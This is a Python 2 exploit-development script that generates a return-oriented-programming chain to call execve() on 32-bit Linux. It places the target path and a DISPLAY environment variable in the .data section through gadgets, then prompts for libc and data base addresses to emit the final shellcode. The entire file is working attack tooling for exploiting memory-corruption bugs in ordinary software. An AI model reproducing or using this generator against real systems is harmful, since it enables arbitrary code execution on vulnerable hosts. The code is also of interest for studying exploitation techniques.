import re
import sys

import gadgets as g

from rop_shellcode import GenerateROPShellcode

"""
This program is to create ROP code for the execve() system call on the fly.

TODO: execve() for commandline applications
"""

"""
@params
path: path of the executable - example: /usr/bin/abiword
The function adds the environment variable DISPLAY=:0.0 to allow applications with GUI to be started.
"""

def gui_execve(path):

    if len(path) % 4 > 0:
        for i in range (0, 4 - len(path) % 4):
            path = path + 'a'

    tokens = re.findall('....', path)

    offset = int('0x18', 16) + len(tokens) * 4

    rop_code = g.xor_eax_eax + g.pop_ecx_pop_edx + 'Padding    : 0x01010101: (To neutralize pop ecx)\\n' + 'Address    : 0x10: Offset for NULL after DISPLAY=:0.0 (.data base)\\n'
    rop_code = rop_code + g.mov_edx_eax
    rop_code = rop_code + g.xor_eax_eax + g.pop_ecx_pop_edx + 'Padding    : 0x01010101: (To neutralize pop ecx)\\n' + 'Address    : 0x18: Offset for envp\\n'
    rop_code = rop_code + g.mov_edx_eax
    rop_code = rop_code + g.xor_eax_eax + g.pop_ecx_pop_edx + 'Padding    : 0x01010101: (To neutralize pop ecx)\\n' + 'Address    : '

    if len(sys.argv[1]) % 4 == 0:
        null_offset = offset + 4
    else:
        null_offset = offset + len(sys.argv[1]) % 4

    rop_code = rop_code + str(hex(null_offset)) + ': Offset for NULL (.data base)\\n'
    rop_code = rop_code + g.mov_edx_eax
    rop_code = rop_code + g.pop_ecx_pop_edx + 'Padding    : 0x01010101: (To neutralize pop ecx)\\n' + 'Address    : 0x14: Offset for DISPLAY=:0.0 (.data base)\\n'
    rop_code = rop_code + g.pop_ecx_pop_ebx + 'Address    : ' + str(hex(null_offset)) + ': Offset for NULL (.data base)\\n' + 'Address    : 0x1c: Offset for ' + tokens[0] + ' (.data base)\\n'
    rop_code = rop_code + g.xor_eax_eax + g.add_eax_b
    rop_code = rop_code + g.call_gs_10

    for token in reversed(tokens):
        commands = [g.pop_ecx_pop_eax + 'Data       : ', 'Address    : ', ': Offset for ', ' (.data base)\\n' + g.mov_eax_ecx]
        commands[0] = commands[0] + '0x'
        token = token[::-1]
        for char in token:
            commands[0] = commands[0] + str(hex(ord(char)))[2:]
        token = token[::-1]
        commands[0] = commands[0] + ": " + token + '\\n'
        commands[1] = commands[1] + str(hex(offset))
        commands[3] = token + commands[3]
        rop_code = ''.join(commands) + rop_code
        offset = offset - 4

    offset = 0xc
    rop_code = g.mov_eax_ecx + rop_code
    rop_code = g.pop_ecx_pop_eax + 'Address    : 0x4: Pointer to DISPLAY:=0.0, NULL\\n' + 'Address    : 0x14: Offset for above pointer (.data base)\\n' + rop_code

    tokens = re.findall('....', 'DISPLAY=:0.0')
    for token in reversed(tokens):
        commands = [g.pop_ecx_pop_eax + 'Data       : ', 'Address    : ', ': Offset for ', ' (.data base)\\n' + g.mov_eax_ecx]
        commands[0] = commands[0] + '0x'
        token = token[::-1]
        for char in token:
            commands[0] = commands[0] + str(hex(ord(char)))[2:]
        token = token[::-1]
        commands[0] = commands[0] + ": " + token + '\\n'
        commands[1] = commands[1] + str(hex(offset))
        commands[3] = token + commands[3]
        rop_code = ''.join(commands) + rop_code
        offset = offset - 4

    return rop_code

def main():

    if len(sys.argv) < 3:
        print 'Enter the path of the executable and if it\'s a GUI(1) or command line(2) application'
        sys.exit(1)

    g.init(sys.argv[len(sys.argv)-1])

    if int(sys.argv[2]) == 1:
        rop_code = gui_execve(sys.argv[1])
        if len(sys.argv) > 3 and sys.argv[3] == 'print':
            print rop_code
            sys.exit(0)
    else:
        sys.exit(0)

    generator = GenerateROPShellcode(padding=0, _id=0, json_file=None)
    generator.code = rop_code.replace('\\n', '\n')[:-2]
    generator.libc_base = hex(int(str(raw_input('Enter the libc base (format - 0xdeadbeef): ')).replace('L', ''), 16))
    generator.data_base = hex(int(str(raw_input('Enter the data base (format - 0xdeadbeef): ')).replace('L', ''), 16))
    generator.padding = int(raw_input('Padding: '))
    generator.write_code = str(raw_input('Would you like to write the code into a file (y/n)? ')) == 'y'
    generator.construct_shellcode()

if __name__ == '__main__':
    main()